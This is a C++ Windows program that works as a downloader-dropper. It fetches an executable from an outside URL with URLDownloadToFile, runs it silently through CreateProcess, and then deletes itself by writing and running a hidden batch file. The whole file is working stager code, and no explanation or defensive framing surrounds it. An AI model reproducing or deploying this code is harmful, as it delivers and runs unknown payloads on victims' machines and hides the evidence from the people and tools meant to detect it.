

//#pragma comment(linker, "/FILEALIGN:256")
#pragma warning(disable:4996)

#include <filesystem>
#include <string>
#include <chrono>
#include <fstream>
#include <iostream>

#if defined(_WIN32)
	#include <Windows.h>
#endif

#include <tchar.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")


void execute(std::string fileToRun, char *dir = NULL) {


	std::vector<char> v3(fileToRun.length() + 1);
	std::strcpy(&v3[0], fileToRun.c_str());
	char *lpApplicationName = &v3[0];


	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// start the program up
	CreateProcess(lpApplicationName,   // the path
		NULL,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		dir,           // Use parent's starting directory by default(if null)
		&si,            // Pointer to STARTUPINFO structure
		&pi);           // Pointer to PROCESS_INFORMATION structure
}


void selfDelete2() {
	std::string filename = "del.bat";
	// my app
	char myApp[MAX_PATH];
	GetModuleFileName(0, myApp, MAX_PATH);
	std::string::size_type pos = std::string(myApp).find_last_of("\\");
	std::string myAppFileName = std::string(myApp).substr(pos + 1, std::string(myApp).length());
	// bat
	char dir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, dir);
	std::string finalDir = std::string(dir) + "\\del.bat";

	std::ofstream file(filename, std::ios::out);
	if (file.is_open()) {
		file << ":Repeat" << std::endl;
		file << "del " + myAppFileName << std::endl;
		file << "if exist " + myAppFileName + " goto Repeat " << std::endl;
		file << "del ""%0"" ";
		file.close();
	}
	ShellExecute(NULL, "open", finalDir.c_str(), NULL, NULL, SW_HIDE);
}






int main() {

	// download exe
	const TCHAR url[] = _T("http://fosse.co/dl/Media.exe");
	const TCHAR location[] = _T("Media.exe");
	HRESULT hr = URLDownloadToFile(NULL, url, location, 0, NULL);


	// execute program
	execute("Media.exe");

	// self delete
	selfDelete2();

	return 0;
}